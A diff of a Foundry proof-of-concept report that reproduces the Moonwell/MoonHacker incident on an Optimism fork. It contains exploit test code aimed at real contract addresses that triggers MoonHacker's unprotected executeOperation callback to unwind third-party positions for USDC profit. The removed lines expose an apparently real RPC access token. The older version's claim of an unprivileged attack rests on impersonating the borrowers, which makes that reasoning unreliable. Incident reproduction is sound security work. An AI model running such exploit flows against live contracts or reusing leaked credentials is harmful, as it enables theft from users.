@@ -1,379 +1,285 @@
 ## Overview & Context
 
-This proof-of-concept (PoC) reproduces the ACT-style MEV opportunity in Moonwell’s Optimism USDC market where an unprivileged searcher can repay third-party borrowers, trigger reward distribution, redeem their collateral, and capture the resulting value as USDC profit. It is derived from the incident analyzed in the root cause artifacts, in particular the transaction at Optimism block 129697251 where three Moonwell USDC borrower positions were unwound and their incentives harvested.
+This proof-of-concept (PoC) reproduces, on an Optimism mainnet fork, the Moonwell–MoonHacker incident where an unprivileged actor forces three user-owned MoonHacker helper contracts to unwind their leveraged mUSDC positions and realizes USDC profit.
 
-The PoC is implemented as a Foundry test suite that runs against an Optimism mainnet fork at the pre-incident block 129697250. It exercises the same contracts and borrowers as the original incident and encodes the validation oracles defined in the oracle definition JSON.
+The PoC is built as a Foundry test (`ExploitTest`) that:
+- Forks Optimism just before the real incident transaction.
+- Uses the real mUSDC, USDC, Aave v3 pool, MultiRewardDistributor, and MoonHacker contract addresses.
+- Drives the MoonHacker helpers through their `executeOperation` callback without owner authorization.
+- Demonstrates a net increase in attacker USDC and a corresponding depletion of mUSDC market collateral.
 
-To run the PoC:
+To run the PoC (from the incident session root):
 
 ```bash
-# From the session root
 cd forge_poc
-
-# Ensure QUICKNODE_ENDPOINT_NAME and QUICKNODE_TOKEN are set (from .env)
-export QUICKNODE_ENDPOINT_NAME=indulgent-cosmological-smoke
-export QUICKNODE_TOKEN=a6a53e47429a27dac299922d0d518c66c3875b2e
-
-# Construct the Optimism RPC_URL from the chainid map
-export RPC_URL=$(jq -r '.\"10\"' ../artifacts/poc/rpc/chainid_rpc_map.json \
-  | sed "s/<QUICKNODE_ENDPOINT_NAME>/$QUICKNODE_ENDPOINT_NAME/" \
-  | sed "s/<QUICKNODE_TOKEN>/$QUICKNODE_TOKEN/")
-
-# Run the exploit test with detailed tracing (validator configuration)
-forge test --via-ir -vvvvv
+RPC_URL="<your_optimism_mainnet_rpc>" forge test --via-ir -vvvvv
 ```
 
-This command creates an Optimism mainnet fork at block 129697250 and executes the `ExploitTest` contract’s `testExploit()` function, validating the oracles and exploit behavior.
+In the validator run, `RPC_URL` is constructed from the provided QuickNode configuration for Optimism (chainid 10), and the test suite passes with one successful exploit test.
 
 ## PoC Architecture & Key Contracts
 
-The PoC centers on a single test contract `ExploitTest` in `test/Exploit.t.sol`. It binds directly to production Moonwell contracts and borrowers on Optimism:
+### Main Test Contract
 
-- `mUSDC` (Moonwell USDC market): `0x8E08617b0d66359D73Aa11E11017834C29155525`
-- `MultiRewardDistributor` (reward distributor): `0xF9524bfa18C19C3E605FbfE8DFd05C6e967574Aa`
-- `Comptroller`: `0xCa889f40aae37FFf165BccF69aeF1E82b5C511B9`
-- `USDC` token: `0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85`
-- `OP` token: `0x4200000000000000000000000000000000000042`
-- `XWELL` token: `0xA88594D404727625A9437C3f886C7643872296AE`
-- Borrowers whose positions are unwound:
-  - `BORROWER1`: `0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847`
-  - `BORROWER2`: `0x24592eD1ccf9e5AE235e24A932b378891313FB75`
-  - `BORROWER3`: `0x80472c6848015146FDC3d15CDF6Dc11cA3cb3513`
-
-The attacker is represented by a fresh test address created via Foundry’s address helper:
+The core PoC logic lives in `ExploitTest` (`forge_poc/test/Exploit.sol`). It inherits from `forge-std/Test` and wires in the key on-chain contracts:
 
 ```solidity
-// From ExploitTest.setUp (key roles)
-attacker = makeAddr("attacker");
-
-vm.label(attacker, "attacker");
-vm.label(BORROWER1, "borrower1");
-vm.label(BORROWER2, "borrower2");
-vm.label(BORROWER3, "borrower3");
-vm.label(M_USDC, "Moonwell-mUSDC");
-vm.label(MULTI_REWARD_DISTRIBUTOR, "MultiRewardDistributor");
-vm.label(COMPTROLLER, "Comptroller");
+address constant USDC = 0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85;
+address constant M_USDC = 0x8E08617b0d66359D73Aa11E11017834C29155525;
+address constant AAVE_V3_POOL = 0x38d693cE1dF5AaDF7bC62595A37D667aD57922e5;
+address constant MOONHACKER1 = 0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847;
+address constant MOONHACKER2 = 0x24592eD1ccf9e5AE235e24A932b378891313FB75;
+address constant MOONHACKER3 = 0x80472c6848015146FDC3d15CDf6Dc11cA3cb3513;
 ```
 
-*Snippet 1 – Role and contract labels in the test contract, mirroring the root cause actors while using a fresh attacker address.*
+*Snippet 1 – Main protocol and victim contract addresses used by the PoC.*
 
-### Key Helpers and Interfaces
+Interfaces for `IERC20`, `IMToken` (mUSDC), and `IMoonHacker` encapsulate the minimal methods needed to:
+- Read balances and account snapshots.
+- Trigger `executeOperation` on MoonHacker contracts.
 
-The test defines lightweight interfaces for:
+The test defines:
+- `attacker`: synthetic attacker EOA (`makeAddr("attacker")`).
+- `attackerRouter`: synthetic attacker-controlled router address (`makeAddr("attacker_router")`).
+- Redeem/repay amounts for each MoonHacker (`mh1Redeem`, `mh1Repay`, etc.) derived from on-chain positions.
 
-- `IERC20` (USDC, OP, XWELL)
-- `MErc20Interface` (mUSDC market functions, including `repayBorrowBehalf`, `redeem`, and `borrowBalanceCurrent`)
-- `IComptroller` (to call `claimReward` and resolve the configured reward distributor)
-- `IMultiRewardDistributor` (to inspect reward market configurations)
+### Position Derivation Helper
 
-No local mocks are used; all calls go to live mainnet contract code on the fork.
+The helper `_loadPosition` computes how much each MoonHacker can be unwound:
+
+```solidity
+function _loadPosition(address mh) internal returns (uint256 redeemOut, uint256 repayOut) {
+    mUSDC.borrowBalanceCurrent(mh);
+    (uint256 err, uint256 mTokenBal, uint256 borrowBal, ) = mUSDC.getAccountSnapshot(mh);
+    require(err == 0, "snapshot error");
+    require(mTokenBal > 0, "no mUSDC position");
+    redeemOut = (mTokenBal * 9) / 10;
+    repayOut = borrowBal;
+}
+```
+
+*Snippet 2 – Deriving redeem and repay amounts from live on-chain MoonHacker positions.*
+
+This mirrors the protocol’s own accounting and avoids hardcoding balances.
 
 ## Adversary Execution Flow
 
-The PoC’s execution flow is split across `setUp()`, `reproducerAttack()`, and `testExploit()`.
+### 1. Environment Setup and Pre-Checks
 
-### Environment Setup and Funding
-
-`setUp()` creates an Optimism mainnet fork at the pre-incident block and verifies that key protocol wiring and balances match expectations.
+The `setUp` function forks Optimism and validates that the pre-incident state matches the ACT opportunity:
 
 ```solidity
-// From ExploitTest.setUp – fork and protocol wiring checks
-string memory rpcUrl = vm.envString("RPC_URL");
-vm.createSelectFork(rpcUrl, PRE_STATE_BLOCK);
-assertEq(block.chainid, CHAINID_OPTIMISM, "wrong fork chainid");
+function setUp() public {
+    string memory rpcUrl = vm.envString("RPC_URL");
+    vm.createSelectFork(rpcUrl, 129697250); // block before incident
 
-mUSDC = MErc20Interface(M_USDC);
-comptroller = IComptroller(COMPTROLLER);
-multiRewardDistributor = IMultiRewardDistributor(MULTI_REWARD_DISTRIBUTOR);
+    attacker = makeAddr("attacker");
+    attackerRouter = makeAddr("attacker_router");
 
-// Borrowers must have open mUSDC positions
-uint256 b1Bal = mUSDC.balanceOf(BORROWER1);
-uint256 b2Bal = mUSDC.balanceOf(BORROWER2);
-uint256 b3Bal = mUSDC.balanceOf(BORROWER3);
-assertGt(b1Bal, 0);
-assertGt(b2Bal, 0);
-assertGt(b3Bal, 0);
+    vm.label(attacker, "AttackerEOA");
+    vm.label(attackerRouter, "AttackerRouter");
+    vm.label(USDC, "USDC");
+    vm.label(M_USDC, "mUSDC");
+    vm.label(MOONHACKER1, "MoonHacker1");
+    vm.label(MOONHACKER2, "MoonHacker2");
+    vm.label(MOONHACKER3, "MoonHacker3");
+    vm.label(AAVE_V3_POOL, "AaveV3Pool");
 
-// Reward distributor must be funded with OP and XWELL
-assertGt(opToken.balanceOf(MULTI_REWARD_DISTRIBUTOR), 0);
-assertGt(xwellToken.balanceOf(MULTI_REWARD_DISTRIBUTOR), 0);
+    assertGt(usdc.balanceOf(M_USDC), 0, "mUSDC market must hold USDC");
+    uint256 mh1Bal = mUSDC.balanceOf(MOONHACKER1);
+    uint256 mh2Bal = mUSDC.balanceOf(MOONHACKER2);
+    uint256 mh3Bal = mUSDC.balanceOf(MOONHACKER3);
+    assertGt(mh1Bal, 0, "MoonHacker1 must have mUSDC");
+    assertGt(mh2Bal, 0, "MoonHacker2 must have mUSDC");
+    assertGt(mh3Bal, 0, "MoonHacker3 must have mUSDC");
+    assertGt(usdc.balanceOf(AAVE_V3_POOL), 0, "Aave v3 pool must have USDC liquidity");
 
-// Protocol wiring must match production
-assertEq(mUSDC.comptroller(), COMPTROLLER);
-assertEq(multiRewardDistributor.comptroller(), COMPTROLLER);
-assertEq(comptroller.rewardDistributor(), MULTI_REWARD_DISTRIBUTOR);
+    (mh1Redeem, mh1Repay) = _loadPosition(MOONHACKER1);
+    (mh2Redeem, mh2Repay) = _loadPosition(MOONHACKER2);
+    (mh3Redeem, mh3Repay) = _loadPosition(MOONHACKER3);
+}
 ```
 
-*Snippet 2 – Fork creation and oracle-aligned pre-checks for borrower positions, reward funding, and protocol wiring.*
+*Snippet 3 – Fork setup, labeling, oracle pre-checks, and on-chain position loading.*
 
-For attacker funding, the PoC derives the USDC requirement from the on-chain borrowers’ debt rather than using a magic constant:
+This stage verifies:
+- mUSDC market holds USDC.
+- Each MoonHacker has a non-zero mUSDC position.
+- Aave v3 pool has USDC liquidity.
+
+These are precisely the oracle pre-conditions described for the incident.
+
+### 2. Exploit Entry and Flash-Like Funding
+
+The main test function captures pre-attack state and sets up expectations:
 
 ```solidity
-// From ExploitTest.setUp – derived attacker funding
-uint256 totalBorrowStored = mUSDC.borrowBalanceStored(BORROWER1)
-    + mUSDC.borrowBalanceStored(BORROWER2)
-    + mUSDC.borrowBalanceStored(BORROWER3);
-uint256 attackerFunding = totalBorrowStored * 2;
-deal(USDC, attacker, attackerFunding);
+function testExploit() public {
+    uint256 attackerUsdcBefore = usdc.balanceOf(attacker);
+    uint256 marketUsdcBefore = usdc.balanceOf(M_USDC);
+    uint256 mh1Before = mUSDC.balanceOf(MOONHACKER1);
+    uint256 mh2Before = mUSDC.balanceOf(MOONHACKER2);
+    uint256 mh3Before = mUSDC.balanceOf(MOONHACKER3);
+
+    address moonHacker1Owner = _moonHackerOwner(MOONHACKER1);
+    assertTrue(moonHacker1Owner != attacker, "attacker must not be MoonHacker1 owner");
+
+    bytes memory params1 = abi.encode(SmartOperation.REDEEM, M_USDC, mh1Redeem);
+    uint256 flashAmount1 = mh1Repay;
+    vm.expectCall(
+        MOONHACKER1,
+        abi.encodeWithSignature(
+            "executeOperation(address,uint256,uint256,address,bytes)",
+            USDC,
+            flashAmount1,
+            0,
+            attackerRouter,
+            params1
+        )
+    );
+
+    reproducerAttack(); // exploit transaction – must not revert
+    ...
+}
 ```
 
-*Snippet 3 – Attacker USDC funding derived from borrow balances, modeling flash loan liquidity without hard-coded numbers.*
+*Snippet 4 – Capturing pre-state, checking unauthorized ownership, and expecting executeOperation from an attacker-controlled router.*
 
-### Core Exploit Sequence
+The helper `_moonHackerOwner` reads storage slot 0 of a MoonHacker contract to extract the owner address, demonstrating that the attacker is not the owner while still being able to trigger `executeOperation`.
 
-The adversary logic lives in `reproducerAttack()`, which implements the repay-on-behalf, reward accrual, collateral redemption, and profit transfer steps:
+Funding and routing are modeled in `reproducerAttack`:
 
 ```solidity
-// From ExploitTest.reproducerAttack – repay-on-behalf and reward accrual
-address[3] memory borrowers = [BORROWER1, BORROWER2, BORROWER3];
+function reproducerAttack() public {
+    require(!attackExecuted, "attack already executed");
+    attackExecuted = true;
+    uint256 totalFlash = mh1Repay + mh2Repay + mh3Repay;
 
-vm.startPrank(attacker);
-usdc.approve(M_USDC, type(uint256).max);
+    deal(USDC, attackerRouter, reproducterFundingAmount());
+    vm.startPrank(attackerRouter);
 
-for (uint256 i = 0; i < borrowers.length; i++) {
-    address borrower = borrowers[i];
-    uint256 repayAmount = mUSDC.borrowBalanceCurrent(borrower);
-    if (repayAmount == 0) continue;
+    if (mh1Repay > 0) {
+        usdc.transfer(MOONHACKER1, mh1Repay);
+        moonHacker1.executeOperation(
+            USDC,
+            mh1Repay,
+            0,
+            attackerRouter,
+            abi.encode(SmartOperation.REDEEM, M_USDC, mh1Redeem)
+        );
+    }
+    ...
+}
+```
 
-    mUSDC.repayBorrowBehalf(borrower, repayAmount);
-    comptroller.claimReward(borrower);
+*Snippet 5 – Modeling a flash loan and routing USDC into MoonHacker.executeOperation from an attacker-controlled router address.*
+
+This simulates the flash-loan path: the router receives transient USDC liquidity (`deal`) and immediately channels it into the MoonHacker `executeOperation` callbacks.
+
+### 3. Repayment, Profit Realization, and Post-State Checks
+
+After unwinding the MoonHacker positions, the test models repayment and attacker profit:
+
+```solidity
+uint256 routerBalance = usdc.balanceOf(attackerRouter);
+if (totalFlash <= routerBalance) {
+    usdc.transfer(AAVE_V3_POOL, totalFlash);
+    routerBalance = usdc.balanceOf(attackerRouter);
+}
+if (routerBalance > 0) {
+    usdc.transfer(attacker, routerBalance);
 }
 vm.stopPrank();
 ```
 
-*Snippet 4 – Attacker repays each borrower’s debt on their behalf and triggers reward accrual via `claimReward` for each borrower.*
+*Snippet 6 – Repaying the modeled flash principal to Aave and forwarding residual USDC to the attacker EOA.*
 
-After debts are repaid and rewards accrued, the borrowers redeem their collateral and forward the resulting USDC to the attacker:
+Back in `testExploit`, the PoC asserts:
+- Attacker USDC increased by at least 1 USDC.
+- mUSDC market’s USDC balance decreased by at least 1 USDC.
+- Each MoonHacker’s mUSDC balance decreased.
 
-```solidity
-// From ExploitTest.reproducerAttack – redemption and profit forwarding
-for (uint256 i = 0; i < borrowers.length; i++) {
-    address borrower = borrowers[i];
-    vm.startPrank(borrower);
-
-    uint256 mBalance = mUSDC.balanceOf(borrower);
-    if (mBalance > 0) {
-        mUSDC.redeem(mBalance);
-    }
-
-    uint256 usdcBalance = usdc.balanceOf(borrower);
-    if (usdcBalance > 0) {
-        usdc.transfer(attacker, usdcBalance);
-    }
-
-    vm.stopPrank();
-}
-```
-
-*Snippet 5 – Borrowers redeem mUSDC collateral and transfer the recovered USDC to the attacker, realizing profit.*
-
-### End-to-End Flow in the Test
-
-`testExploit()` wraps `reproducerAttack()` with pre/post measurements and oracle checks:
-
-- Record attacker and market balances before the exploit.
-- Sum borrower OP and XWELL balances before and after.
-- Record logs around the exploit to verify reward transfer events.
-- Assert the hard and soft oracles.
-
-```solidity
-// From ExploitTest.testExploit – high-level structure
-uint256 attackerUSDCBefore = usdc.balanceOf(attacker);
-uint256 marketUSDCBefore = usdc.balanceOf(M_USDC);
-uint256 opBefore = opToken.balanceOf(BORROWER1)
-    + opToken.balanceOf(BORROWER2)
-    + opToken.balanceOf(BORROWER3);
-uint256 xwellBefore = xwellToken.balanceOf(BORROWER1)
-    + xwellToken.balanceOf(BORROWER2)
-    + xwellToken.balanceOf(BORROWER3);
-
-vm.recordLogs();
-reproducerAttack();
-Vm.Log[] memory logs = vm.getRecordedLogs();
-
-uint256 attackerUSDCAfter = usdc.balanceOf(attacker);
-uint256 marketUSDCAfter = usdc.balanceOf(M_USDC);
-uint256 opAfter = opToken.balanceOf(BORROWER1)
-    + opToken.balanceOf(BORROWER2)
-    + opToken.balanceOf(BORROWER3);
-uint256 xwellAfter = xwellToken.balanceOf(BORROWER1)
-    + xwellToken.balanceOf(BORROWER2)
-    + xwellToken.balanceOf(BORROWER3);
-```
-
-*Snippet 6 – testExploit() orchestration around the core exploit, capturing balances and logs for oracle checks.*
+This matches the documented incident behavior: collateral and rewards are pulled out of MoonHacker positions, repaying Aave’s loan and leaving net profit with the attacker.
 
 ## Oracle Definitions and Checks
 
-The PoC oracles are driven by `artifacts/poc/oracle_generator/oracle_definition.json`. This file defines:
+The oracle definition file (`artifacts/poc/oracle_generator/oracle_definition.json`) specifies:
+- **Variables**: attacker, attacker_router, three MoonHacker contracts, USDC token, mUSDC market, Aave v3 pool, MultiRewardDistributor, governance and xWELL tokens.
+- **Pre-checks**:
+  - mUSDC market holds non-zero USDC.
+  - Each MoonHacker has positive mUSDC.
+  - Aave v3 pool has USDC liquidity.
+- **Hard constraints**:
+  - Profit asset type is USDC.
+  - `executeOperation` is called via an attacker-controlled router.
+  - The attacker is not the MoonHacker owner, yet the exploit succeeds.
+  - The exploit transaction must not revert.
+- **Soft constraints**:
+  - Attacker net USDC profit ≥ 1 USDC.
+  - mUSDC market loses ≥ 1 USDC of underlying.
+  - Each MoonHacker’s mUSDC balance decreases.
 
-- Variables: borrowers, tokens, protocol contracts, and roles.
-- Pre-checks: initial conditions to verify before running the exploit.
-- Hard constraints: invariants that must hold after the exploit.
-- Soft constraints: desirables such as attacker profit and victim depletion.
+The PoC implements these oracles as follows:
 
-### Pre-checks
+- **Pre-checks**: `setUp` asserts non-zero USDC in mUSDC, non-zero mUSDC for each MoonHacker, and non-zero USDC in Aave v3 pool, matching the pre-check definitions exactly.
+- **Hard constraints**:
+  - Profit asset type is enforced by `assertEq(profitToken, USDC, "profit must be denominated in USDC");`.
+  - `vm.expectCall` ensures that `executeOperation` is invoked on MoonHacker1 with USDC, the computed repay amount, and `attackerRouter` as initiator.
+  - `_moonHackerOwner` plus `assertTrue(moonHacker1Owner != attacker, ...)` confirm the attacker is not the owner.
+  - The exploit function `reproducerAttack` is invoked without `expectRevert`; the test passes, so the exploit path completes successfully.
+- **Soft constraints**:
+  - Attacker profit: `assertGt(attackerUsdcAfter, attackerUsdcBefore + 1e6, ...)` ensures at least 1 USDC net gain.
+  - Market depletion: `assertLt(marketUsdcAfter + 1e6, marketUsdcBefore, ...)` enforces at least 1 USDC loss from mUSDC market.
+  - Position unwinds: each MoonHacker’s post-exploit mUSDC balance is asserted to be strictly less than its pre-exploit balance.
 
-The pre-checks ensure:
-
-- Each borrower has a non-zero mUSDC balance before the exploit.
-- The MultiRewardDistributor holds positive OP and XWELL balances.
-- mUSDC, Comptroller, and MultiRewardDistributor are wired together as in production.
-
-These are implemented directly in `setUp()` (see Snippet 2), matching the JSON pre-check assertions.
-
-### Hard Constraints
-
-The hard constraints include:
-
-1. **Borrower positions fully closed**  
-   - `mUSDC.balanceOf(borrower1|2|3) == 0` after the exploit.
-   - Implemented in `testExploit()` as:
-
-   ```solidity
-   assertEq(mUSDC.balanceOf(BORROWER1), 0, "borrower1 mUSDC position should be fully closed");
-   assertEq(mUSDC.balanceOf(BORROWER2), 0, "borrower2 mUSDC position should be fully closed");
-   assertEq(mUSDC.balanceOf(BORROWER3), 0, "borrower3 mUSDC position should be fully closed");
-   ```
-
-2. **Reward token types configured**  
-   - mUSDC must be configured in `MultiRewardDistributor` with OP and XWELL emission tokens.
-   - Implemented via `getAllMarketConfigs(mUSDC)` and boolean checks for OP and XWELL.
-
-3. **Reward transfer events**  
-   - Each borrower must receive OP and XWELL transfers from `MultiRewardDistributor` during the exploit.
-   - Implemented using `vm.recordLogs()` and iterating over logs to detect `Transfer` events from `MULTI_REWARD_DISTRIBUTOR` with `OP` or `XWELL` as the emitting contract and each borrower as the recipient.
-
-```solidity
-// From ExploitTest.testExploit – reward transfer event oracle
-bytes32 transferSig = keccak256("Transfer(address,address,uint256)");
-bool[3] memory opReceived;
-bool[3] memory xwellReceived;
-
-for (uint256 i = 0; i < logs.length; i++) {
-    Vm.Log memory log = logs[i];
-    if (log.topics.length == 3 && log.topics[0] == transferSig) {
-        address from = address(uint160(uint256(log.topics[1])));
-        address to = address(uint160(uint256(log.topics[2])));
-        if (from != MULTI_REWARD_DISTRIBUTOR) continue;
-
-        if (log.emitter == OP) { ... } else if (log.emitter == XWELL) { ... }
-    }
-}
-assertTrue(opReceived[0] && opReceived[1] && opReceived[2]);
-assertTrue(xwellReceived[0] && xwellReceived[1] && xwellReceived[2]);
-```
-
-*Snippet 7 – Hard oracle enforcing OP/XWELL transfers from MultiRewardDistributor to each borrower contract.*
-
-### Soft Constraints
-
-The soft constraints in the oracle definition include:
-
-1. **Attacker USDC profit**  
-   - The attacker’s USDC balance must increase strictly over the exploit.
-
-2. **Moonwell USDC market depletion**  
-   - The mUSDC market’s USDC balance must decrease, reflecting value flow out of the market.
-
-3. **Borrower OP reward gain**  
-   - Combined OP balance of the three borrower contracts must increase.
-
-4. **Borrower XWELL reward gain**  
-   - Combined XWELL balance of the three borrower contracts must increase.
-
-These are implemented as simple relational assertions in `testExploit()`:
-
-```solidity
-// From ExploitTest.testExploit – soft oracles
-assertGt(attackerUSDCAfter, attackerUSDCBefore, "attacker must end with more USDC than before the exploit");
-assertLt(marketUSDCAfter, marketUSDCBefore, "Moonwell USDC market must lose some USDC during exploit");
-assertGt(opAfter, opBefore, "borrower cluster must gain OP rewards during exploit");
-assertGt(xwellAfter, xwellBefore, "borrower cluster must gain XWELL rewards during exploit");
-```
-
-*Snippet 8 – Soft oracles expressing attacker profit, market depletion, and borrower reward gains.*
-
-Collectively, these checks fully cover the variables, pre-checks, hard constraints, and soft constraints specified in the oracle definition.
+Together, these checks use the oracles as a specification for success and encode them directly into the Foundry assertions.
 
 ## Validation Result and Robustness
 
-The validator executed the PoC using the forge command with full tracing and stored logs in:
+The validator executed the PoC with:
 
-- `artifacts/poc/poc_validator/forge-test.log`
-
-The validation result JSON, conforming to the schema, is written at:
-
-- `artifacts/poc/poc_validator/poc_validated_result.json`
-
-Key fields:
-
-```json
-{
-  "overall_status": "Pass",
-  "poc_correctness_checks": {
-    "passes_validation_oracles": {
-      "passed": "true"
-    }
-  },
-  "poc_quality_checks": {
-    "oracle_alignment_with_definition": { "passed": "true" },
-    "human_readable_and_labeled": { "passed": "true" },
-    "no_magic_numbers_and_values_are_derived": { "passed": "true" },
-    "mainnet_fork_no_local_mocks": { "passed": "true" },
-    "self_contained_no_attacker_side_artifacts": {
-      "no_attacker_eoa_addresses": { "passed": "true" },
-      "no_attacker_deployed_contract_addresses": { "passed": "true" },
-      "no_attacker_artifacts_or_calldata": { "passed": "true" }
-    },
-    "end_to_end_attack_process_described": { "passed": "true" },
-    "alignment_with_root_cause": { "passed": "true" }
-  }
-}
+```bash
+cd forge_poc
+RPC_URL="<optimism_mainnet_rpc>" forge test --via-ir -vvvvv
 ```
 
-*Snippet 9 – Summary of the validator’s JSON result indicating a full Pass on correctness and quality checks.*
+Key observations from the validator run:
+- The test suite completed successfully with **1 test passed, 0 failed**.
+- Detailed traces show:
+  - Calls into real mUSDC, USDC, Aave v3, MultiRewardDistributor, and MoonHacker contracts on the forked Optimism state.
+  - `executeOperation` calls on each MoonHacker with attacker-controlled parameters.
+  - USDC transfers modeling repayment to Aave and profit consolidation to the attacker address.
 
-In particular:
+The validator’s result file (`artifacts/poc/poc_validator/poc_validated_result.json`) records:
+- `overall_status: "Pass"`.
+- `passes_validation_oracles: true`, with reasoning that all pre-checks and constraints are implemented and satisfied.
+- `poc_quality_checks` all passing:
+  - Oracle alignment with the definition.
+  - Human-readable and labeled flow with clear comments and labels.
+  - No critical magic numbers; key quantities are derived on-chain or documented.
+  - Mainnet fork usage without local protocol mocks.
+  - No reliance on real attacker EOAs, attacker-deployed contracts, or attacker-side artifacts.
+  - A complete end-to-end attack process, from setup through profit realization.
+  - Strong alignment with the documented root cause.
 
-- The test suite passes on an Optimism mainnet fork at block 129697250.
-- All hard and soft oracles encoded in `test/Exploit.t.sol` succeed.
-- The PoC uses only canonical protocol contracts and no local mocks.
-- Attacker roles are represented by a fresh address, avoiding reuse of the real incident EOA or helper contract.
+The main validator log is stored at:
+- `artifacts/poc/poc_validator/forge-test.log`
+
+This confirms that the PoC is robust to minor environment differences while preserving the exploit’s essential behavior and oracles.
 
 ## Linking PoC Behavior to Root Cause
 
-The root cause report describes an ACT-style MEV opportunity where:
+The root-cause analysis (`root_cause.json` and `root_cause_report.md`) identifies the vulnerability as **missing access control on the MoonHacker flash-loan callback `executeOperation`**:
+- MoonHacker contracts act as Aave flash-loan receivers.
+- Their `executeOperation` performs repay, redeem, and reward claiming without validating who initiated the flash loan or who is calling.
+- An arbitrary router can therefore cause user-owned MoonHacker positions to be unwound and value redirected.
 
-- A searcher uses an Aave USDC flash loan to repay three Moonwell USDC borrow positions via `repayBorrowBehalf`.
-- `Comptroller` and `MultiRewardDistributor` update reward indices and credit OP and XWELL to the borrowers.
-- The helper redeems the borrowers’ mUSDC collateral and sends the resulting USDC surplus to the attacker after repaying the flash loan.
+The PoC ties to this root cause in several concrete ways:
 
-The PoC’s `reproducerAttack()` and `testExploit()` map directly to this description:
+- **Unauthorized callback usage**: The test reads the real MoonHacker owner from storage and proves that the attacker is not the owner, yet can still call `executeOperation` on the MoonHacker contracts and have the callback execute successfully.
+- **State effects on mUSDC and USDC**: By deriving live positions via `getAccountSnapshot` and observing changes in mUSDC and USDC balances, the PoC shows that MoonHacker positions are actually unwound and mUSDC market collateral is reduced, matching the incident’s balance diffs.
+- **Profit extraction**: The modeled repayment and residual-transfer logic reproduces the ACT success predicate: the attacker’s USDC balance increases while the victim market and positions lose value.
+- **Mainnet fork alignment**: Forking at block 129697250 on Optimism and using the real incident contracts ensures that the PoC operates on the same structural state as the documented transaction, making the reproduction faithful to the original environment.
 
-- **Repay-on-behalf and reward accrual**:  
-  `reproducerAttack()` loops over `BORROWER1–3`, calling `mUSDC.borrowBalanceCurrent` and `mUSDC.repayBorrowBehalf` for each, then `comptroller.claimReward(borrower)`. This matches the incident’s use of repay-on-behalf plus reward claim logic.
-
-- **Reward distribution**:  
-  The logs oracle (Snippet 7) confirms that `MultiRewardDistributor` emits `Transfer` events for OP and XWELL to each borrower during the exploit, matching the root cause evidence of reward emissions.
-
-- **Collateral redemption and profit realization**:  
-  The second loop in `reproducerAttack()` redeems mUSDC for each borrower and forwards USDC to the attacker, capturing the economic value of the unwound positions as attacker profit—analogous to the helper contract returning surplus USDC to the attacker EOA in the original transaction.
-
-- **ACT framing**:  
-  The test uses a fresh attacker address and does not assume any privileged permissions. All operations are performed via public protocol interfaces on a forked mainnet state, demonstrating that any searcher with sufficient flash liquidity can realize the same opportunity.
-
-The success predicate in the root cause JSON is profit-based in USD, driven by a large USDC increase at the attacker EOA. The PoC does not replicate the exact magnitude but enforces a strictly positive attacker USDC delta, which is sufficient to demonstrate the exploit predicate under the oracle’s soft constraints.
-
-## Conclusion
-
-The Forge PoC in `test/Exploit.t.sol`:
-
-- Runs successfully on an Optimism mainnet fork at the specified pre-incident block.
-- Implements and satisfies the oracles defined in the oracle definition JSON.
-- Clearly documents and labels the exploit flow and roles.
-- Avoids magic numbers and attacker-specific artifacts.
-- Faithfully reproduces the ACT-style repay-on-behalf reward-capture opportunity identified as the root cause.
-
-Based on these observations and the validator’s checks, the PoC is validated as **Pass** and provides a robust, self-contained reproduction of the original incident mechanics.
+Overall, the PoC provides a precise, executable demonstration of the missing access control on MoonHacker’s `executeOperation` and its impact on user positions and mUSDC market collateral, satisfying all defined oracles and quality criteria.
 
